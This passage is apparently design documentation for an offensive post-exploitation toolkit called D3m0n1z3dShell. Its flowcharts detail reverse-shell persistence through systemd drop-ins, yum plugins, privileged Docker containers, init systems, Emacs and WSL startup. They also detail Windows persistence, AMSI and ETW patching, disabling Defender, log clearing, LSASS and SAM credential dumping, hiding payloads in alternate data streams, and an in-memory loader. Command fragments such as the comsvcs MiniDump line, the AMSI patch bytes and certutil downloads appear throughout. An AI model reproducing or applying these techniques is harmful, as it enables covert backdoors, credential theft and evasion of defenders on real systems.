    G --> H["Write override.conf:\n[Service]\nExecStartPost=/bin/sh -c\nnohup bash revshell"]
    H --> I["systemctl daemon-reload"]
    I --> J["Payload fires on every\nservice start/restart"]

    B -->|2| K["Same flow with custom command\ninstead of revshell"]

    B -->|3| L["systemctl list-units\n--state=running"]

    B -->|4| M["find /etc/systemd/system\n-name override.conf\ngrep MARKER"]

    B -->|5| N["Remove override.conf files\nrmdir empty .d dirs\ndaemon-reload"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff0000,color:#fff
    style J fill:#44aa44,color:#fff
    style N fill:#4488ff,color:#fff
```

**Key Insight:** SystemD drop-in directories (`/etc/systemd/system/SERVICE.service.d/`) allow overriding any directive without touching the original unit file. `ExecStartPost=` runs after the main process starts, so the payload piggybacks on legitimate service restarts. This survives package updates that would overwrite the original `.service` file.

---

### 75 — Yum/DNF Plugin Backdoor

**Script:** `scripts/yum_backdoor.sh` | **Menu:** [75] | **MITRE:** T1546  
**Purpose:** Inject payload execution into existing Yum/DNF Python plugins so code runs every time the package manager is invoked by the administrator.

```mermaid
flowchart TD
    A["yum_backdoor.sh"] --> B["detect_pkg_manager():\ncheck yum vs dnf"]
    B --> C["Select:\n1. Reverse shell injection\n2. Custom command\n3. List injected plugins\n4. Cleanup"]

    C -->|1| D["Target: /usr/lib/yum-plugins/\nDefault: fastestmirror.py"]
    D --> E{"Plugin exists and\nhas import os?"}
    E -->|No| F["Abort"]
    E -->|Yes| G["cp plugin plugin.d3m0n.bak"]
    G --> H["sed -i after import os:\nos.system setsid\nbash revshell"]
    H --> I["rm .pyc compiled cache"]
    I --> J["Every yum/dnf command\ntriggers payload"]

    C -->|2| K["Same injection flow\nwith custom os.system()"]

    C -->|3| L["grep -rl MARKER\n/usr/lib/yum-plugins/"]

    C -->|4| M["Restore .d3m0n.bak files\nto original names"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff0000,color:#fff
    style J fill:#44aa44,color:#fff
    style M fill:#4488ff,color:#fff
```

**Key Insight:** Yum plugins are Python files loaded on every `yum`/`dnf` invocation. Since sysadmins routinely run package managers, the injected `os.system()` call fires frequently. The `.pyc` cache must be deleted to force Python to recompile the modified `.py` source.

---

### 76 — Docker Container Persistence

**Script:** `scripts/docker_persist.sh` | **Menu:** [76] | **MITRE:** T1610  
**Purpose:** Deploy a privileged Docker container with `--restart=always` and full host filesystem access that loops a payload indefinitely, surviving host reboots.

```mermaid
flowchart TD
    A["docker_persist.sh"] --> B{"docker ps\naccessible?"}
    B -->|No| C["Abort"]
    B -->|Yes| D["Select:\n1. Deploy revshell container\n2. Custom command\n3. List containers\n4. Cleanup"]

    D -->|1| E["docker pull alpine:latest"]
    E --> F["Create entrypoint.sh:\nwhile true loop\nrevshell + sleep N"]
    F --> G["docker create temp container\ndocker cp entrypoint.sh\ndocker commit to image"]
    G --> H["docker run -dit\n--privileged\n-v /:/host\n--restart=always\n--label MARKER"]
    H --> I["Container loops payload\nSurvives reboot via\nDocker restart policy"]

    D -->|2| J["Same flow with\ncustom command in loop"]

    D -->|3| K["docker ps -a\n--filter label=MARKER"]

    D -->|4| L["docker rm -f containers\ndocker rmi images\nwith MARKER label/prefix"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff0000,color:#fff
    style I fill:#44aa44,color:#fff
    style L fill:#4488ff,color:#fff
```

**Key Insight:** Docker's `--restart=always` policy ensures the container restarts after host reboot (as long as Docker daemon starts). The `--privileged -v /:/host` flags give full access to the host filesystem at `/host`. The image is committed so even if the container is deleted, the image can be re-run.

---

### 77 — OpenRC Service Persistence

**Script:** `scripts/openrc_persist.sh` | **Menu:** [77] | **MITRE:** T1543  
**Purpose:** Create an OpenRC init script for persistent service execution on Alpine Linux, Gentoo, and other OpenRC-based systems.

```mermaid
flowchart TD
    A["openrc_persist.sh"] --> B{"rc-update\navailable?"}
    B -->|No| C["Abort: not OpenRC"]
    B -->|Yes| D["Select:\n1. Reverse shell service\n2. Custom command\n3. List installed\n4. Cleanup"]

    D -->|1| E["Write /etc/init.d/SERVICE:\n#!/sbin/openrc-run\ncommand=/bin/sh\ncommand_args=revshell loop\ncommand_background=yes\npidfile=/run/SVC.pid"]
    E --> F["depend block:\nneed net"]
    F --> G["chmod 755\nrc-update add SERVICE default"]
    G --> H["Service starts at boot\nwith network dependency"]

    D -->|2| I["Same openrc-run format\nwith custom command"]

    D -->|3| J["grep -rl MARKER\n/etc/init.d/"]

    D -->|4| K["rc-service stop\nrc-update del\nrm init script"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style H fill:#44aa44,color:#fff
    style K fill:#4488ff,color:#fff
```

**Key Insight:** OpenRC uses a different init script format (`#!/sbin/openrc-run`) than SystemD. The `command_background="yes"` directive handles daemonization, and `depend()` ensures network is available before execution. Alpine Linux (common in containers and embedded systems) uses OpenRC by default.

---

### 78 — Upstart Service Persistence

**Script:** `scripts/upstart_persist.sh` | **Menu:** [78] | **MITRE:** T1543  
**Purpose:** Create Upstart job configurations for persistent execution on legacy Ubuntu (pre-15.04) and CentOS 6 systems.

```mermaid
flowchart TD
    A["upstart_persist.sh"] --> B{"initctl\navailable?"}
    B -->|No| C["Abort: not Upstart"]
    B -->|Yes| D["Select:\n1. Reverse shell job\n2. Custom command\n3. List installed\n4. Cleanup"]

    D -->|1| E["Write /etc/init/JOB.conf:\ndescription System Cache Manager\nstart on runlevel [2345]\nstop on runlevel [!2345]\nrespawn\nrespawn limit 10 5\nexec while-loop revshell"]
    E --> F["initctl reload-configuration"]
    F --> G["Job auto-starts on boot\nrespawns if killed"]

    D -->|2| H["Same .conf format\nwith custom exec command"]

    D -->|3| I["grep -rl MARKER\n/etc/init/"]

    D -->|4| J["initctl stop job\nrm .conf file\ninitctl reload-configuration"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style G fill:#44aa44,color:#fff
    style J fill:#4488ff,color:#fff
```

**Key Insight:** Upstart's `respawn` directive automatically restarts the process if killed, with `respawn limit 10 5` allowing 10 restarts in 5 seconds before giving up. Many legacy enterprise systems still run Upstart (Ubuntu 10.04-14.10, CentOS 6, RHEL 6).

---

### 79 — Emacs Extension Persistence

**Script:** `scripts/emacs_persist.sh` | **Menu:** [79] | **MITRE:** T1546  
**Purpose:** Plant a malicious Emacs Lisp package that executes a payload whenever the target user launches Emacs.

```mermaid
flowchart TD
    A["emacs_persist.sh"] --> B["Select:\n1. Reverse shell extension\n2. Custom command\n3. List installed\n4. Cleanup"]

    B -->|1| C["Resolve target user homedir\nvia getent passwd"]
    C --> D["mkdir ~/.emacs.d/lisp/"]
    D --> E["Write d3m0n-helper.el:\ndefun d3m0n-system-init\nstart-process sys-cache\n/bin/sh -c revshell\nprovide d3m0n-helper"]
    E --> F{"init.el already\nhas MARKER?"}
    F -->|Yes| G["Skip init.el modification"]
    F -->|No| H["Backup init.el\nAppend:\nadd-to-list load-path lisp\nrequire d3m0n-helper"]
    H --> I["chown files to target user"]
    I --> J["Payload fires on every\nEmacs startup"]

    B -->|2| K["Same .el file with\ncustom shell command"]

    B -->|3| L["find /home /root\n-name d3m0n-helper.el"]

    B -->|4| M["Delete .el files\nRestore init.el.d3m0n.bak"]

    style A fill:#ff4444,color:#fff
    style E fill:#ff0000,color:#fff
    style J fill:#44aa44,color:#fff
    style M fill:#4488ff,color:#fff
```

**Key Insight:** Emacs Lisp's `start-process` launches external commands asynchronously without blocking the editor. The `(provide 'feature)` / `(require 'feature)` mechanism ensures the package loads automatically. Targets developers and sysadmins who use Emacs as their primary editor.

---

### 80 — IGEL OS Persistence

**Script:** `scripts/igel_persist.sh` | **Menu:** [80] | **MITRE:** T1546  
**Purpose:** Achieve persistence on IGEL OS thin client endpoints via writable partition exploitation or registry parameter injection.

```mermaid
flowchart TD
    A["igel_persist.sh"] --> B{"IGEL OS detected?\n/etc/igel or\n/config/sessions"}
    B -->|No| C["Abort: not IGEL"]
    B -->|Yes| D["Select:\n1. /license partition\n2. Registry setparam\n3. Cleanup"]

    D -->|1| E["mount -o remount,rw /license"]
    E --> F["Write payload script to\n/license/.d3m0n_persist"]
    F --> G["chmod 755"]
    G --> H["mount -o remount,ro /license"]
    H --> I["Payload persists across\nIGEL reboots"]

    D -->|2| J["Read command from user"]
    J --> K["base64 encode command"]
    K --> L["setparam registry key:\nuserinterface.rccustom.\ncustom_cmd_net_final"]
    L --> M["Payload runs after\nnetwork initialization"]

    D -->|3| N["remount /license rw\nrm .d3m0n_persist\nremount ro\nclear setparam key"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff0000,color:#fff
    style L fill:#ff0000,color:#fff
    style I fill:#44aa44,color:#fff
    style M fill:#44aa44,color:#fff
    style N fill:#4488ff,color:#fff
```

**Key Insight:** IGEL OS thin clients have a read-only filesystem with specific writable partitions (`/license`). The `setparam` command modifies the IGEL registry, and `custom_cmd_net_final` executes after network initialization on every boot. Base64 encoding avoids character escaping issues in the registry value.

---

### 81 — WSL Startup Folder Persistence

**Script:** `scripts/wsl_persist.sh` | **Menu:** [81] | **MITRE:** T1546  
**Purpose:** Establish cross-subsystem persistence from WSL by placing launchers in the Windows Startup folder or creating scheduled tasks.

```mermaid
flowchart TD
    A["wsl_persist.sh"] --> B{"WSL detected?\ngrep microsoft\n/proc/version"}
    B -->|No| C["Abort: not WSL"]
    B -->|Yes| D["Resolve Windows paths:\ncmd.exe /C echo APPDATA\nwslpath conversion"]
    D --> E["Select:\n1. VBS launcher\n2. BAT launcher\n3. Scheduled task\n4. Cleanup"]

    E -->|1| F["Write .vbs to Startup:\nCreateObject WScript.Shell\nRun wsl.exe -d DISTRO\n-- /bin/sh -c PAYLOAD\nWindow style 0 hidden"]
    F --> G["Stealthiest: no visible\nconsole window"]

    E -->|2| H["Write .bat to Startup:\nstart /b wsl.exe -d DISTRO\n-- /bin/sh -c PAYLOAD"]

    E -->|3| I["schtasks /Create\n/TN SystemCacheHelper\n/SC ONLOGON /RL HIGHEST\nwsl.exe -d DISTRO payload"]

    E -->|4| J["rm Startup/*.SystemCacheHelper*\nschtasks /Delete /TN helper"]

    style A fill:#ff4444,color:#fff
    style F fill:#ff0000,color:#fff
    style G fill:#44aa44,color:#fff
    style H fill:#ff8800,color:#fff
    style I fill:#ff8800,color:#fff
    style J fill:#4488ff,color:#fff
```

**Key Insight:** WSL can invoke Windows executables and vice versa. By placing a VBS/BAT file in the Windows Startup folder from within WSL, Linux payloads execute on Windows user logon. The VBS method is stealthiest because `WScript.Shell.Run` with window style 0 hides the console entirely.

---

### 82 — Periodic/Anacron Persistence

**Script:** `scripts/periodic_persist.sh` | **Menu:** [82] | **MITRE:** T1053  
**Purpose:** Install persistent scripts via BSD periodic framework, anacron, or cron.daily directories, auto-detecting the best available mechanism.

```mermaid
flowchart TD
    A["periodic_persist.sh"] --> B["detect_system()"]
    B --> C{"System type?"}
    C -->|BSD| D["/etc/periodic exists"]
    C -->|Anacron| E["/etc/anacrontab exists"]
    C -->|Linux| F["/etc/cron.daily exists"]

    D --> G["Select:\n1. Revshell  2. Custom\n3. List  4. Cleanup"]
    E --> G
    F --> G

    G -->|BSD| H["Write /etc/periodic/daily/\n999.d3m0n-persist\nchmod 755\nexit 0 at end"]

    G -->|Anacron| I["Write script to\n/usr/local/bin/.d3m0n-periodic\nAdd to /etc/anacrontab:\nDAYS  DELAY  d3m0n-persist  PATH"]

    G -->|cron.daily| J["Write /etc/cron.daily/\nd3m0n-persist\nchmod 755"]

    H --> K["Runs daily/weekly/monthly\nvia periodic framework"]
    I --> L["Runs on schedule\nwith delay randomization"]
    J --> M["Runs daily via cron"]

    G -->|Cleanup| N["Remove scripts\nClean anacrontab entries"]

    style A fill:#ff4444,color:#fff
    style H fill:#ff0000,color:#fff
    style I fill:#ff0000,color:#fff
    style J fill:#ff0000,color:#fff
    style K fill:#44aa44,color:#fff
    style L fill:#44aa44,color:#fff
    style M fill:#44aa44,color:#fff
    style N fill:#4488ff,color:#fff
```

**Key Insight:** BSD periodic runs scripts from `/etc/periodic/{daily,weekly,monthly}/` via the periodic utility. Anacron handles machines that aren't always on — it tracks last-run timestamps and executes missed jobs on next boot. The auto-detection cascade (periodic → anacron → cron.daily) ensures maximum compatibility across BSD, RHEL/CentOS, Debian, and other systems.

---

## 9. Windows Persistence Generator

**Script:** `scripts/win_persist.sh` | **Menu:** [61]  
**Purpose:** Generate PowerShell (.ps1) payloads for 8 Windows persistence techniques with optional WinRM delivery.

```mermaid
flowchart TD
    A["win_persist.sh"] --> B["Banner + PAYLOAD_DIR setup"]
    B --> C["Auto-detect LHOST via ip addr"]
    C --> D["Select technique:<br>1. Registry Run Keys<br>2. Scheduled Task<br>3. Windows Service<br>4. WMI Event Subscription<br>5. COM Object Hijacking<br>6. BITS Job Persistence<br>7. Startup Folder<br>8. DLL Search Order Hijacking"]

    D -->|1| E1["Generate .ps1:<br>New-ItemProperty HKCU:\\..\\Run<br>or HKLM:\\..\\Run<br>or RunOnce variant"]
    D -->|2| E2["Generate .ps1:<br>Register-ScheduledTask<br>-Trigger: AtLogon/Daily/Idle/AtStartup<br>-Action: PowerShell reverse shell"]
    D -->|3| E3["Generate .ps1:<br>New-Service -BinaryPathName<br>with legit-sounding name<br>+ sc.exe failure recovery"]
    D -->|4| E4["Generate .ps1:<br>3-part WMI: Filter + Consumer + Binding<br>__EventFilter → CommandLineEventConsumer"]
    D -->|5| E5["Generate .ps1:<br>Registry COM CLSID hijack<br>ScriptletURL / InprocServer32"]
    D -->|6| E6["Generate .ps1:<br>Start-BitsTransfer<br>-SetNotifyCmdLine PAYLOAD"]
    D -->|7| E7["Generate .ps1:<br>Create .lnk via COM WScript.Shell<br>in $env:APPDATA\\..\\Startup"]
    D -->|8| E8["Generate .ps1:<br>Copy malicious DLL to<br>Teams/OneDrive/Slack DLL search paths"]

    E1 --> F["Save to payloads/filename.ps1"]
    E2 --> F
    E3 --> F
    E4 --> F
    E5 --> F
    E6 --> F
    E7 --> F
    E8 --> F

    F --> G["_winrm_deliver():<br>1. Manual copy<br>2. Python HTTP + IEX download cradle<br>3. Evil-WinRM upload<br>4. WinRM Invoke-Command<br>5. Skip"]

    style A fill:#aa44aa,color:#fff
    style F fill:#ff8800,color:#fff
    style G fill:#4488ff,color:#fff
```

#### WMI Event Subscription Detail

```mermaid
sequenceDiagram
    participant PS as PowerShell Script
    participant WMI as WMI Repository
    participant OS as Windows OS

    PS->>WMI: Create __EventFilter<br>(Win32_ProcessStartTrace or<br>__InstanceModificationEvent)
    PS->>WMI: Create CommandLineEventConsumer<br>(payload command line)
    PS->>WMI: Create __FilterToConsumerBinding<br>(links filter → consumer)

    Note over WMI: Stored in WMI repository<br>Survives reboots<br>No files on disk (fileless)

    OS->>WMI: Matching event occurs<br>(e.g. process starts, user logs in)
    WMI->>OS: Execute consumer payload
```

---

## 10. Windows Defense Evasion Generator

**Script:** `scripts/win_evasion.sh` | **Menu:** [62]  
**Purpose:** Generate PowerShell payloads for 7 Windows defense evasion techniques.

```mermaid
flowchart TD
    A["win_evasion.sh"] --> B["Select technique:<br>1. AMSI Bypass<br>2. Disable Windows Defender<br>3. ETW Patching<br>4. Event Log Clearing<br>5. LOLBin Proxy Execution<br>6. Timestomping<br>7. Parent PID Spoofing"]

    B -->|1| C1["3 variants:<br>a. Reflection amsiInitFailed = true<br>b. AmsiScanBuffer memory patch (0xC3 ret)<br>c. Obfuscated string assembly"]
    B -->|2| C2["Set-MpPreference -DisableRealtimeMonitoring $true<br>Registry: DisableAntiSpyware = 1<br>Add-MpPreference -ExclusionPath C drive root"]
    B -->|3| C3["Get EtwEventWrite address via<br>GetProcAddress(ntdll, 'EtwEventWrite')<br>VirtualProtect → Write 0xC3 (ret)"]
    B -->|4| C4["wevtutil cl Security/System/Application<br>or Stop-Service EventLog"]
    B -->|5| C5["mshta javascript:...<br>rundll32 javascript:...<br>regsvr32 /s /u scrobj.dll (Squiblydoo)<br>certutil -urlcache -split -f URL<br>msiexec /q /i URL"]
    B -->|6| C6["(Get-Item file).CreationTime =<br>Copy from C:\\Windows\\System32\\notepad.exe"]
    B -->|7| C7["STARTUPINFOEX + P/Invoke<br>UpdateProcThreadAttribute<br>CreateProcess with spoofed PPID"]

    C1 --> D["Save .ps1 → _winrm_deliver()"]
    C2 --> D
    C3 --> D
    C4 --> D
    C5 --> D
    C6 --> D
    C7 --> D

    style A fill:#aa44aa,color:#fff
    style C1 fill:#ff0000,color:#fff
    style C3 fill:#ff0000,color:#fff
    style C7 fill:#ff8800,color:#fff
```

#### AMSI Bypass Memory Patch Detail

```mermaid
flowchart TD
    A["Load amsi.dll via<br>[Ref].Assembly.GetType()"] --> B["Get AmsiScanBuffer<br>method address"]
    B --> C["VirtualProtect: set<br>PAGE_EXECUTE_READWRITE"]
    C --> D["Marshal.Copy([0xB8,0x57,0x00,0x07,0x80,0xC3])<br>MOV EAX, 0x80070057 (E_INVALIDARG)<br>RET"]
    D --> E["All future AMSI scans<br>return AMSI_RESULT_CLEAN"]

    style D fill:#ff0000,color:#fff
    style E fill:#44aa44,color:#fff
```

---

## 11. Windows Credential Access Generator

**Script:** `scripts/win_credaccess.sh` | **Menu:** [63]  
**Purpose:** Generate PowerShell payloads for 5 credential access techniques.

```mermaid
flowchart TD
    A["win_credaccess.sh"] --> B["Select technique:<br>1. LSASS Memory Dump<br>2. SAM/SYSTEM Extraction<br>3. Kerberoasting<br>4. DPAPI Secret Extraction<br>5. WiFi Password Extraction"]

    B -->|1| C1["3 methods:<br>a. rundll32 comsvcs.dll,MiniDump LSASS_PID<br>b. P/Invoke MiniDumpWriteDump<br>c. Task Manager method (manual)"]
    B -->|2| C2["reg save HKLM\\SAM sam.save<br>reg save HKLM\\SYSTEM sys.save<br>OR: Volume Shadow Copy →<br>copy from VSS snapshot"]
    B -->|3| C3["setspn -T domain -Q */*<br>Request TGS tickets<br>Export in hashcat/john format:<br>$krb5tgs$23$*..."]
    B -->|4| C4["Chrome/Edge: Copy Login Data SQLite<br>DPAPI: CryptUnprotectData via P/Invoke<br>Credential Manager vault enumeration"]
    B -->|5| C5["netsh wlan show profiles<br>netsh wlan show profile name=X key=clear<br>Export all as XML"]

    C1 --> D["Save .ps1 → _winrm_deliver()"]
    C2 --> D
    C3 --> D
    C4 --> D
    C5 --> D

    style A fill:#aa44aa,color:#fff
    style C1 fill:#ff0000,color:#fff
    style C2 fill:#ff0000,color:#fff
```

#### LSASS Dump via comsvcs.dll

```mermaid
flowchart TD
    A["Get LSASS PID:<br>Get-Process lsass | Select Id"] --> B["rundll32.exe<br>C:\\Windows\\System32\\comsvcs.dll,<br>MiniDump PID C:\\temp\\lsass.dmp full"]
    B --> C["Dump file created"]
    C --> D["Exfiltrate lsass.dmp"]
    D --> E["Offline: mimikatz<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonpasswords"]

    style B fill:#ff0000,color:#fff
```

---

## 12. Windows Stealth & Indicator Removal

**Script:** `scripts/win_stealth.sh` | **Menu:** [64]  
**Purpose:** Generate PowerShell payloads for 4 stealth techniques.

```mermaid
flowchart TD
    A["win_stealth.sh"] --> B["Select technique:<br>1. Alternate Data Streams<br>2. Hidden Files & Directories<br>3. Process Name Masquerading<br>4. Secure Deletion & Indicator Removal"]

    B -->|1| C1["Hide payload in ADS:<br>Set-Content -Path file.txt -Stream d3m0n<br>Execute from ADS:<br>wmic process call create 'cmd /c type file.txt:d3m0n | cmd'<br>Enumerate: Get-Item -Stream *"]
    B -->|2| C2["attrib +h +s +r FILE<br>Registry: NoFolderOptions=1<br>ShowSuperHidden=0<br>Hidden=2 (lock Explorer settings)"]
    B -->|3| C3["Trusted path mimicry:<br>Copy payload to C:\\Windows \\System32\\<br>(note trailing space in 'Windows ')<br>Or rename to svchost.exe, csrss.exe"]
    B -->|4| C4["Multi-pass overwrite:<br>[IO.File]::WriteAllBytes(file, random)<br>Remove-Item -Force<br>Clean: Prefetch, Recent, Temp,<br>Event Logs, USN Journal"]

    C1 --> D["Save .ps1 → _winrm_deliver()"]
    C2 --> D
    C3 --> D
    C4 --> D

    style A fill:#aa44aa,color:#fff
    style C1 fill:#ff8800,color:#fff
    style C4 fill:#ff0000,color:#fff
```

#### Alternate Data Streams Detail

```mermaid
flowchart TD
    A["Target file: document.txt"] --> B["Set-Content -Path document.txt<br>-Stream 'hidden_payload'<br>-Value PAYLOAD_DATA"]
    B --> C["ADS created: document.txt:hidden_payload"]
    C --> D["dir /r shows streams<br>Normal dir does NOT"]
    D --> E["Execute:<br>powershell -ep bypass -c<br>(Get-Content document.txt -Stream hidden_payload) | iex"]

    style B fill:#ff8800,color:#fff
    style C fill:#ff8800,color:#fff
```

---

## Build System

**Script:** `build.sh`  
**Purpose:** Compile D3m0n1z3dShell into standalone executables for targets without bash/sh.

```mermaid
flowchart TD
    A["./build.sh MODE"] --> B{"Parse mode"}

    B -->|static| C["build_static()"]
    C --> C1["get_static_bash():<br>1. Check /bin/bash-static<br>2. apt install bash-static<br>3. Compile from source"]
    C1 --> C2["objcopy: embed bash as ELF .rodata"]
    C2 --> C3["objcopy: embed script.sh as ELF .rodata"]
    C3 --> C4["Write loader.c (heredoc):<br>memfd_create() for bash + script<br>fork() + execve(/proc/self/fd/N)"]
    C4 --> C5["gcc -O2 -static loader.c bash.o script.o"]
    C5 --> C6["strip -s build/d3m0nized"]
    C6 --> OUT1["build/d3m0nized<br>~3.4MB static ELF<br>Zero target dependencies"]

    B -->|sfx| D["build_sfx()"]
    D --> D1["get_static_bash()"]
    D1 --> D2["Stage: bash + demonizedshell.sh +<br>scripts/ + static-binaries/ + locutus/"]
    D2 --> D3["tar czf payload.tar.gz"]
    D3 --> D4["Write shell stub with<br>__D3M0N_ARCHIVE__ marker"]
    D4 --> D5["cat payload.tar.gz >> stub"]
    D5 --> OUT2["build/d3m0nized-sfx<br>~17MB self-extracting<br>Needs /bin/sh + tar"]

    B -->|shc| E["build_shc()"]
    E --> E1["shc -f demonizedshell_static.sh<br>-o build/d3m0nized-shc -r"]
    E1 --> OUT3["build/d3m0nized-shc<br>~253KB obfuscated<br>Needs bash on target"]

    B -->|all| F["build_static + build_sfx + build_shc"]
    B -->|clean| G["rm -rf build/"]

    style A fill:#4488ff,color:#fff
    style OUT1 fill:#44aa44,color:#fff
    style OUT2 fill:#44aa44,color:#fff
    style OUT3 fill:#44aa44,color:#fff
```

#### Static Binary Loader (memfd_create)

```mermaid
flowchart TD
    A["main()"] --> B["Read embedded symbols:<br>_binary_bash_start/end<br>_binary_script_sh_start/end"]
    B --> C["bash_fd = make_memfd('ld', bash_data, size)"]
    C --> D{"memfd_create<br>syscall succeeded?"}
    D -->|Yes| E["write_all(bash_fd, data)"]
    D -->|No| F["Fallback: mkstemp in<br>/dev/shm → unlink → write"]
    E --> G["script_fd = make_memfd('rc', script_data, size)"]
    F --> G
    G --> H["Build paths:<br>/proc/self/fd/bash_fd<br>/proc/self/fd/script_fd"]
    H --> I["Setup signal forwarding:<br>SIGINT, SIGTERM, SIGHUP"]
    I --> J["fork()"]
    J -->|Child| K["execve(bash_path,<br>['d3m0nized', script_path],<br>envp)"]
    J -->|Parent| L["waitpid(child)<br>Forward signals"]
    K --> M["Script runs entirely<br>from memory — zero disk I/O"]

    style A fill:#4488ff,color:#fff
    style C fill:#ff8800,color:#fff
    style K fill:#44aa44,color:#fff
    style M fill:#44aa44,color:#fff
```

---

> **Total: 102 techniques documented** — 78 Linux + 24 Windows sub-techniques  
> **Diagrams: 108+ Mermaid flowcharts**, sequence diagrams, and state diagrams  
> **Coverage: Complete MITRE ATT&CK mapping** across all tactics
